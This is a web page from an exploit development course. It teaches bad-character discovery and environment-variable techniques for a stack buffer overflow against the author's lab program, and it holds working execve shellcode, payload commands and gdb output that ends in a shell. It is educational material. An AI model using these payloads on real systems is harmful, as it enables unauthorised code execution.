<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <meta name="description" content="">
    <meta name="keywords" content="">
    <title>BlueHood - Cyber Security Learning</title>
    <!-- Bootstrap -->
    <link href="../css/bootstrap.min.css" rel="stylesheet">
    <!-- Style CSS -->
    <link href="../css/styles.css" rel="stylesheet">
    <!-- Google Fonts -->
    <link href="https://fonts.googleapis.com/css?family=Nunito+Sans:200,200i,300,300i,400,400i,600,600i,700,700i,800,800i,900,900i" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css?family=PT+Serif:400,400i,700,700i" rel="stylesheet">
    <!-- FontAwesome CSS -->
    <link rel="stylesheet" type="text/css" href="../css/fontello.css">
    <link href="../css/font-awesome.min.css" rel="stylesheet">
    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
</head>

<body>
    <div class="header-wrapper">
        <div class="container">
            <div class="row">
                <div class="col-lg-2 col-md-2 col-sm-12 col-xs-12">
                    <a href="index.html"><img src="../images/logo2.png" alt="" style="width:75px;height:75px;" class="alignright"></a>
                </div>
                <div class="col-lg-8 col-md-10 col-sm-12 col-xs-12">
                    <div class="navigation">
                        <div id="navigation">
                            <ul>
                                <li class="active"><a href="../index.html" title="Home">Home</a></li>
                                <li class="active"><a href="../pentesting.html" title="Penetration Testing">Penetration Testing</a></li>
                                <li class="active"><a href="../exploitdev.html" title="Exploit Development">Exploit Development</a></li>
                                <li class="active"><a href="../malware.html" title="Malware">Malware</a></li>
                                <li class="active"><a href="../shellcode.html" title="Shellcode">Shellcode</a></li>
                                
                            </ul>
                        </div>
                    </div>
                </div>
                <div class="col-lg-2 hidden-md hidden-sm hidden-xs">
                    <div class="header-btn"><a href="#" class="btn btn-header">get started</a></div>
                </div>
            </div>
        </div>
    </div>
    <!-- header-section close -->
    <!-- page-header-start -->
    <div class="page-header">
        <div class="container">
            <div class="row">
                <div class="col-lg-6 col-md-6 col-sm-6 col-xs-12">
                    <div class="page-section">
                        <h1 class="page-title ">Exploit Devlopment</h1>
                        <h3 class="page-title ">2.4 Environment Variables: Improving Our Exploit </h1>
                        <div class="page-breadcrumb">
                            <ol class="breadcrumb">
                                <li><a href="../exploitdev.html">Exploit Development</a></li>
                                <li>2. Stack Based Buffer Overflows</li>
                                <li>2.4 Environment Variables: Improving Our Exploit</li>
                            </ol>
                        </div>
                    </div>
                </div>
                <div class="col-lg-6 col-md-6 col-sm-6 hidden-xs">
                    <div class="page-section">
                         <p>Now that we have a working exploit its time to make it even better. At the moment our exploit is clunky. As we will demonstrate it will not work all the time because the location at which the program is loaded in memory is variable. To address this issue we will work with environment variables to improve the reliability of our exploits. Firstly, we take a detour and talk about bad characters. </p>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <!-- page-header-close -->
    <div class="space-medium">
        <div class="container">
            <div class="row">
                <div class="col-lg-8 col-md-8 col-sm-8 col-xs-12">
                    <div class="row">
                        <div class="col-lg-12 col-sm-12 col-md-12 col-xs-12">
                            <div class="post-block">
                                <!-- post holder -->
                                <div class="post-img">
                                    <!-- post img -->
                                    <a href="#" class="imghover"><img src="images/post-img-1.jpg" alt="" class="img-responsive"></a>
                                </div>
                                <!-- /.post img -->
                                <div class="post-content">
                                    <!-- post content -->
                                    <div class="post-header">

                                    </div>
                                    <!-- /.post header -->
                                    <p style="color: red;">All the content on this website, including this post, is intended for educational use only. The techniques and processes presented should only be used against systems you own or have explicit written permission to target. Otherwise, you are breaking the Law - be smart. The author/s of this website will not accept any liability for misuse of this content.</p>
                                    <br>
                                    <img src="./images/2-4-meme.jpg" alt="" class="img-responsive" style="display:block; margin-right: auto; margin-left: auto;"></a><br><br>
                                    <h2> Bad Characters </h2>
                                    <p>The idea of bad characters is that program handle certain characters in user input differently. One example of these characters are null characters (\x00). If this character is seen by the program in a user input it will immediately terminate the buffer. Other common characters that might do this are newline characters (\x0a) and the carriage return characters (\x0d). Programs might also ignore certain characters when provided as user input. It is critical that our exploit code does not contain any of these characters otherwise our exploit won't work - note this includes our Shellcode. </p>
                                    <p>In the last post, we made no such checks - we were lucky that we did not include any bad characters in our exploit. Let's go through and do this now. </p>
                                    <p>Firstly we write a short Python script that will generate a list of all possible ASCII characters.</p>
                                    <pre>(generate.py)

characters = ["0","1","2","3","4","5","6","7","8","9","a","b","c","d","e","f"]
badchars = ""

for i in characters:
    for j in characters:
        badchars += "\\x" + str(i) + str(j)

print(badchars)</pre>               
                                    <pre>debug@lbuntu:~/Documents/exploitdev/chapter2/stack$ python3 generate.py 
\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
debug@lbuntu:~/Documents/exploitdev/chapter2/stack$ </pre>
                                    <p>We exclude the null character as this will truncate the buffer by definition. We write the following script which will print out these bad characters. We use Perl as gdb-peda seems to handle Perl better than Python.</p>
                                    <pre>(badchars.pl)

print “\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\...”</pre>
                                   
                                    <p>Now we run gdb and execute the program, inputting the character list as user input. </p>
                                    <pre>debug@lbuntu:~/Documents/exploitdev/chapter2/stack$ gdb simple_overflow 
GNU gdb (Ubuntu 8.2-0ubuntu1~18.04) 8.2
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
 <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from simple_overflow...(no debugging symbols found)...done.
gdb-peda$ run a
Starting program: /home/debug/Documents/exploitdev/chapter2/stack/simple_overflow a
Hello a
[Inferior 1 (process 1966) exited normally]
Warning: not running
^[[Agdb-pebreak *0x00400589
Breakpoint 1 at 0x400589
gdb-peda$ run $(perl badchars.pl)
Starting program: /home/debug/Documents/exploitdev/chapter2/stack/simple_overflow $(perl badchars.pl)

...

Breakpoint 1, 0x00400589 in say_hi ()
gdb-peda$ x/64xw $esp
0xbffff2b0: 0x00400660  0xbffff2c8  0xb7fffd8c  0x0040055c
0xbffff2c0: 0xbffff3b0  0x00000000  <b>0x04030201  0x08070605</b> (Buffer terminates here)
0xbffff2d0: 0xb7fffc00  0x00000000  0x00000000  0x00000000
0xbffff2e0: 0x00000000  0xb7fff000  0x00000000  0x00000000
0xbffff2f0: 0x00000000  0x00000000  0x00000000  0x00000000
0xbffff300: 0x00000009  0xb7fba000  0x000000c2  0x00002fff
0xbffff310: 0xb7fff000  0xb7fd71d0  0xb7e7b669  0x000000c2
0xbffff320: 0xb7ffe984  0xb7ffe988  0xbffff36a  0xb7e7b9c0
0xbffff330: 0xbffff36a  0xb7ffe984  0xb7ffe988  0xbffff378
0xbffff340: 0xbffff37c  0xbffff36b  0x00000001  0x000000c2
0xbffff350: 0x00000000  0x00c30000  0x00000001  0xb7ffe900
0xbffff360: 0xbffff3b0  0x00000000  0x00000000  0x93814c00
0xbffff370: 0x00000009  0xbffff5aa  0xb7e124f9  0xb7fbd748
0xbffff380: 0xb7fba000  0xb7fba000  0x00000000  0xb7e1265b
0xbffff390: 0xb7fba3fc  0x00000000  0xbffff3b8  0x004005c9
0xbffff3a0: 0xbffff5ea  0xbffff464  0xbffff478  0x004005b1
gdb-peda$ </pre>
                                    <p>As you can see the sequence 0x01020304, 0x05060708 is written to the buffer but no \x09. This character terminates the buffer. We remove this characters from our Perl script and repeat the process.</p>
                                    <pre>(badchars.pl)

print “\x01\x02\x03\x04\x05\x06\x07\x08\x0a\x0b\ ...”</pre>
                                    <pre>run $(perl badchars.pl)
Starting program: /home/debug/Documents/exploitdev/chapter2/stack/simple_overflow $(perl badchars.pl)

...

gdb-peda$ x/64xw $esp
0xbffff2b0: 0x00400660  0xbffff2c8  0xb7fffd8c  0x0040055c
0xbffff2c0: 0xbffff3b0  0x00000000  <b>0x04030201  0x08070605</b> (Buffer terminates here)
0xbffff2d0: 0xb7fffc00  0x00000000  0x00000000  0x00000000
0xbffff2e0: 0x00000000  0xb7fff000  0x00000000  0x00000000
0xbffff2f0: 0x00000000  0x00000000  0x00000000  0x00000000
0xbffff300: 0x00000009  0xb7fba000  0x000000c2  0x00002fff
0xbffff310: 0xb7fff000  0xb7fd71d0  0xb7e7b669  0x000000c2
0xbffff320: 0xb7ffe984  0xb7ffe988  0xbffff36a  0xb7e7b9c0
0xbffff330: 0xbffff36a  0xb7ffe984  0xb7ffe988  0xbffff378
0xbffff340: 0xbffff37c  0xbffff36b  0x00000001  0x000000c2
0xbffff350: 0x00000000  0x00c30000  0x00000001  0xb7ffe900
0xbffff360: 0xbffff3b0  0x00000000  0x00000000  0xb4056200
0xbffff370: 0x00000009  0xbffff5aa  0xb7e124f9  0xb7fbd748
0xbffff380: 0xb7fba000  0xb7fba000  0x00000000  0xb7e1265b
0xbffff390: 0xb7fba3fc  0x00000000  0xbffff3b8  0x004005c9
0xbffff3a0: 0xbffff5ea  0xbffff464  0xbffff478  0x004005b1
gdb-peda$ </pre>
                                    <p>The same thing happens. This means that \x0a is also a bad character and should be removed. This is reasonable as \x0a is a newline character. We remove this bad character and repeat. </p>
                                    <pre>(badchars.pl)

print \x01\x02\x03\x04\x05\x06\x07\x08\x0b\x0c\ ..."</pre>

                                    <pre>gdb-peda$ run  $(perl badchars.pl)
Starting program: /home/debug/Documents/exploitdev/chapter2/stack/simple_overflow  $(perl badchars.pl)

...

Breakpoint 1, 0x00400589 in say_hi ()
gdb-peda$ x/64xw $esp
0xbffff2b0: 0x00400660  0xbffff2c8  0xb7fffd8c  0x0040055c
0xbffff2c0: 0xbffff3b0  0x00000000  <b>0x04030201  0x08070605
0xbffff2d0: 0x0e0d0c0b  0x1211100f  0x16151413  0x1a191817
0xbffff2e0: 0x1e1d1c1b</b>  0xb7ff00<b>1f</b>  0x00000000  0x00000000 (Buffer terminates here)
0xbffff2f0: 0x00000000  0x00000000  0x00000000  0x00000000
0xbffff300: 0x00000009  0xb7fba000  0x000000c2  0x00002fff
0xbffff310: 0xb7fff000  0xb7fd71d0  0xb7e7b669  0x000000c2
0xbffff320: 0xb7ffe984  0xb7ffe988  0xbffff36a  0xb7e7b9c0
0xbffff330: 0xbffff36a  0xb7ffe984  0xb7ffe988  0xbffff378
0xbffff340: 0xbffff37c  0xbffff36b  0x00000001  0x000000c2
0xbffff350: 0x00000000  0x00c30000  0x00000001  0xb7ffe900
0xbffff360: 0xbffff3b0  0x00000000  0x00000000  0x8e0c1600
0xbffff370: 0x00000009  0xbffff5ab  0xb7e124f9  0xb7fbd748
0xbffff380: 0xb7fba000  0xb7fba000  0x00000000  0xb7e1265b
0xbffff390: 0xb7fba3fc  0x00000000  0xbffff3b8  0x004005c9
0xbffff3a0: 0xbffff5eb  0xbffff464  0xbffff474  0x004005b1
gdb-peda$ </pre>
                                    <p>We see that the character \x20 now terminates the buffer. We remove this character and repeat. We do not bore the reader with the details - this process was repeated until no further bad characters were identified. This gave us no further bad characters. Thus the bad characters are \x09\x0a\x20.
</p>
                                    <p>Thus we know that we cannot include these characters in our exploits against this program at any point, including in the Shellcode or the return address. Obviously it made little difference doing this exercise as there are only three bad characters and none of them featured in our original exploit (which was lucky). But for larger applications, there may be many bad characters and then we must be careful to avoid them. In such a case this exercise is essential. </p>

                                    <h2> Environment Variables </h2>
                                    <p>The Arch Linux wiki defines environment variables as “An environment variable is a named object that contains data used by one or more applications. In simple terms, it is a variable with a name and a value.”[1] One example of an environment variable is the Path variable, which stores common paths of executable files on the file system. This way when you type commands like ‘cat’ you don't have to specify the full path to the executable. We can view all the environment variables on our system. </p>
                                    <pre>debug@lbuntu:~/Documents/exploitdev/chapter2/stack$ env
LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:
SSH_CONNECTION=192.168.1.160 55548 192.168.1.208 22
LESSCLOSE=/usr/bin/lesspipe %s %s
LANG=en_GB.UTF-8
XDG_SESSION_ID=5
USER=debug
PWD=/home/debug/Documents/exploitdev/chapter2/stack
HOME=/home/debug
SSH_CLIENT=192.168.1.160 55548 22
SSH_TTY=/dev/pts/1
MAIL=/var/mail/debug
TERM=xterm-256color
SHELL=/bin/bash
SHLVL=1
LANGUAGE=en_GB:en
LOGNAME=debug
DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus
XDG_RUNTIME_DIR=/run/user/1000
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
LESSOPEN=| /usr/bin/lesspipe %s
_=/usr/bin/env
OLDPWD=/home/debug
debug@lbuntu:~/Documents/exploitdev/chapter2/stack$ </pre>
                                    <p>To explain why environment variables are important in this contexts let try running our exploit outside of the gdb debugging environment against the simple_overflow program. </p>
                                    <pre>debug@lbuntu:~/Documents/exploitdev/chapter2/stack$ ./simple_overflow $(perl -e 'print "\x90"x150 . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" . "A"x3 . "\xd6\xf3\xff\xbf"x10')
Hello ������������������������������������������������������������������������������������������������������������������������������������������������������1�Ph//shh/bin��PS���
 AAA����������������������������������������
Segmentation fault (core dumped)
debug@lbuntu:~/Documents/exploitdev/chapter2/stack$</pre>
                                    <p>What?! We get a segmentation fault yet it worked in gdb. Why does this happen? The answer is the environment variables. When run inside the gdb debugger the program is run in a different environment with different environment variables (strictly speaking the environment variables are the same but located at different memory addresses on the Stack. gdb may also add environment variables depending on your configuration). This causes the Stack frame we are exploiting to be located in a different location in memory. Thus our return address is wrong and our exploit fails. </p>
                                    <p>There are a few ways around this: debugging and running our exploit under the same environment and using environment variables. </p>

                                    <h2> Debugging and running the Exploit Under the Same Environment </h2> 
                                    <p>We solve our problem by debugging in gdb under the same environment as the simple_overflow program. In particular, we will run them with all environment variables cleared (that is with 'no environment'). We run gdb without any environment variables. </p>
                                    <pre>debug@lbuntu:~/Documents/exploitdev/chapter2/stack$ env -i gdb ./simple_overflow

Type "apropos word" to search for commands related to "word"...
Reading symbols from ./simple_overflow...(no debugging symbols found)...done.
(gdb) unset env LINES
(gdb) unset env COLUMNS
(gdb)</pre>

<p>We unset two more environment variables that are loaded by gdb by default. Run our previous exploit and inspect the Stack.</p>


<pre>Starting program: /home/debug/Documents/exploitdev/chapter2/stack/simple_overflow $(perl -e 'print "\x90"x150 . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" . "A"x3 . "\xd6\xf3\xff\xbf"x10')

Breakpoint 1, 0x00400589 in say_hi ()
(gdb) x/64xw $esp
0xbffffbc0: 0x00400660  0xbffffbd8  0xb7fffd8c  0x0040055c
0xbffffbd0: 0xbffffcc0  0x00000000  0x90909090  0x90909090
0xbffffbe0: 0x90909090  0x90909090  0x90909090  0x90909090
0xbffffbf0: 0x90909090  0x90909090  0x90909090  0x90909090
0xbffffc00: 0x90909090  0x90909090  0x90909090  0x90909090
0xbffffc10: 0x90909090  0x90909090  0x90909090  0x90909090
0xbffffc20: 0x90909090  0x90909090  0x90909090  0x90909090
0xbffffc30: 0x90909090  0x90909090  0x90909090  0x90909090
0xbffffc40: 0x90909090  0x90909090  0x90909090  0x90909090
0xbffffc50: 0x90909090  0x90909090  0x90909090  0x90909090
0xbffffc60: 0x90909090  0x90909090  0x90909090  0xc0319090
0xbffffc70: 0x2f2f6850  0x2f686873  0x896e6962  0x895350e3
0xbffffc80: 0xcd0bb0e1  0x41414180  0xbffff3d6  0xbffff3d6
0xbffffc90: 0xbffff3d6  0xbffff3d6  0xbffff3d6  0xbffff3d6
0xbffffca0: 0xbffff3d6  0xbffff3d6  0xbffff3d6  0xbffff3d6
0xbffffcb0: 0xbffffe00  0xbffffd74  0xbffffd80  0x004005b1
(gdb) info frame
Stack level 0, frame at 0xbffffcb0:
 eip = 0x400589 in say_hi; saved eip = <b>0xbffff3d6</b>
 called by frame at 0xbffff3de
 Arglist at 0xbffffca8, args: 
 Locals at 0xbffffca8, Previous frame's sp is 0xbffffcb0
 Saved registers:
 ebx at 0xbffffca4, ebp at 0xbffffca8, eip at 0xbffffcac
(gdb) </pre>
                                    <p>As you can see the return address is no longer pointing into our NOP Sled as our Stack frame was loaded into a different location on the Stack. We now choose a different address in the middle of the NOP Sled (which doesn't contain any bad characters); 0xbffffc30 will do. We amend our exploit. </p>
                                    <pre>(exploit)
$(perl -e 'print "\x90"x150 . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" . "A"x3 . "\x30\xfc\xff\xbf"x10')</pre>

                                    <p>We run our modified exploit. </p>
                                    <pre>Starting program: /home/debug/Documents/exploitdev/chapter2/stack/simple_overflow $(perl -e 'print "\x90"x150 . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" . "A"x3 . "\x30\xfc\xff\xbf"x10')

Breakpoint 1, 0x00400589 in say_hi ()
(gdb) x/64xw $esp
0xbffffbc0: 0x00400660  0xbffffbd8  0xb7fffd8c  0x0040055c
0xbffffbd0: 0xbffffcc0  0x00000000  0x90909090  0x90909090
0xbffffbe0: 0x90909090  0x90909090  0x90909090  0x90909090
0xbffffbf0: 0x90909090  0x90909090  0x90909090  0x90909090
0xbffffc00: 0x90909090  0x90909090  0x90909090  0x90909090
0xbffffc10: 0x90909090  0x90909090  0x90909090  0x90909090
0xbffffc20: 0x90909090  0x90909090  0x90909090  0x90909090
0xbffffc30: 0x90909090  0x90909090  0x90909090  0x90909090
0xbffffc40: 0x90909090  0x90909090  0x90909090  0x90909090
0xbffffc50: 0x90909090  0x90909090  0x90909090  0x90909090
0xbffffc60: 0x90909090  0x90909090  0x90909090  0xc0319090
0xbffffc70: 0x2f2f6850  0x2f686873  0x896e6962  0x895350e3
0xbffffc80: 0xcd0bb0e1  0x41414180  0xbffffc30  0xbffffc30
0xbffffc90: 0xbffffc30  0xbffffc30  0xbffffc30  0xbffffc30
0xbffffca0: 0xbffffc30  0xbffffc30  0xbffffc30  0xbffffc30
0xbffffcb0: 0xbffffe00  0xbffffd74  0xbffffd80  0x004005b1
(gdb) info frame
Stack level 0, frame at 0xbffffcb0:
 eip = 0x400589 in say_hi; saved eip = <b>0xbffffc30</b>
 called by frame at 0xbffffc38
 Arglist at 0xbffffca8, args: 
 Locals at 0xbffffca8, Previous frame's sp is 0xbffffcb0
 Saved registers:
 ebx at 0xbffffca4, ebp at 0xbffffca8, eip at 0xbffffcac
(gdb) </pre>
                                    <p>Now RET is pointing into our NOP Sled we should be good to go.</p>
                                    <pre>(gdb) continue
Continuing.
Hello ������������������������������������������������������������������������������������������������������������������������������������������������������1�Ph//shh/bin��PS���
 AAA0���0���0���0���0���0���0���0���0���0���
process 1419 is executing new program: /bin/dash
$ id
[Detaching after fork from child process 1421]
uid=1000(debug) gid=1000(debug) groups=1000(debug),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),122(sambashare)
$ </pre>
                                    <p>Indeed we get our Shell - the exploit works. This means the exploit should work under the same environment when executed outside gdb. Let's try this out.</p>
                                    <pre>debug@lbuntu:~/Documents/exploitdev/chapter2/stack$ env -i <b>$(pwd)</b>/simple_overflow $(perl -e 'print "\x90"x150 . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" . "A"x3 . "\x30\xfc\xff\xbf"x10')
Hello ������������������������������������������������������������������������������������������������������������������������������������������������������1�Ph//shh/bin��PS���
 AAA0���0���0���0���0���0���0���0���0���0���
$ id
uid=1000(debug) gid=1000(debug) groups=1000(debug),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),122(sambashare)
$ </pre>
                                    <p>Woop our exploit is now working. Note that we have to specify the full path of the executable (hence the $(pwd)) since gdb specifies the full path when running programs. Neglecting to do this will change the location at which the Stack frame is loaded and our exploit might not work. </p>

                                    <h2>Writing our Shellcode to Environment Variables</h2>

                                    <p>We can set our own environment variables. What we are going to do is export an environment variable that contains our Shellcode with a NOP Sled before it. We will then tweak our exploit so that the program jumps into our environment variable, slides down the NOP Sled and executes the Shellcode.</p>
                                    <p>We write our Shellcode to the environment variable SHELLCODE and prepend the Shellcode with a NOP Sled.</p>
                                    <pre>debug@lbuntu:~/Documents/exploitdev/chapter2/stack$ export SHELLCODE=$(perl -e 'print "\x90"x200 . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')
debug@lbuntu:~/Documents/exploitdev/chapter2/stack$ echo $SHELLCODE
��������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������1�Ph//shh/bin��PS���

debug@lbuntu:~/Documents/exploitdev/chapter2/stack$</pre>
                                    <p>As you can see we have successfully written our own environment variable. </p>
                                    <pre>ebug@lbuntu:~/Documents/exploitdev/chapter2/stack$ env
LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:
SSH_CONNECTION=192.168.1.160 56790 192.168.1.208 22
LESSCLOSE=/usr/bin/lesspipe %s %s
LANG=en_GB.UTF-8
OLDPWD=/home/debug
XDG_SESSION_ID=8
<b>SHELLCODE</b>=��������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������1�Ph//shh/bin��PS���

USER=debug
PWD=/home/debug/Documents/exploitdev/chapter2/stack
HOME=/home/debug
SSH_CLIENT=192.168.1.160 56790 22
SSH_TTY=/dev/pts/0
MAIL=/var/mail/debug
TERM=xterm-256color
SHELL=/bin/bash
SHLVL=1
LANGUAGE=en_GB:en
LOGNAME=debug
DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus
XDG_RUNTIME_DIR=/run/user/1000
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
LESSOPEN=| /usr/bin/lesspipe %s
_=/usr/bin/env
debug@lbuntu:~/Documents/exploitdev/chapter2/stack$ </pre>
                                    <p>Let's go back into gdb and see where our environment variable is located on the Stack. </p>
                                    <pre>debug@lbuntu:~/Documents/exploitdev/chapter2/stack$ gdb ./simple_overflow 
GNU gdb (Ubuntu 8.2-0ubuntu1~18.04) 8.2
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
